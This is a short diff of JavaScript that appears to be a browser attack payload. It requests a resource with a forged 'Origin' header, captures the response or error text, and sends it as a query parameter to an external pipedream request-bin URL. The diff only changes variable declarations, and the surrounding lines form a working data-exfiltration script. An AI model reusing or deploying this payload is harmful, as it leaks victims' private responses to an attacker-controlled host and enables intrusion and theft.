@@ -9,12 +9,12 @@
         req.setRequestHeader('Origin', '0.0.0.0:8080');
         await req.send();
         if(req.status == 200) {
-          src = 'success placeholder';
-          src = req.response;
+          var src = 'success placeholder';
+          var src = req.response;
         }
         else {
-          src = 'error placeholder';
-          src = req.statusText;
+          var src = 'error placeholder';
+          var src = req.statusText;
         }
         var req_webhook = new XMLHttpRequest();
         req_webhook.open('GET', 'https://en54ypp3nacrf.x.pipedream.net/?src='+src, true);
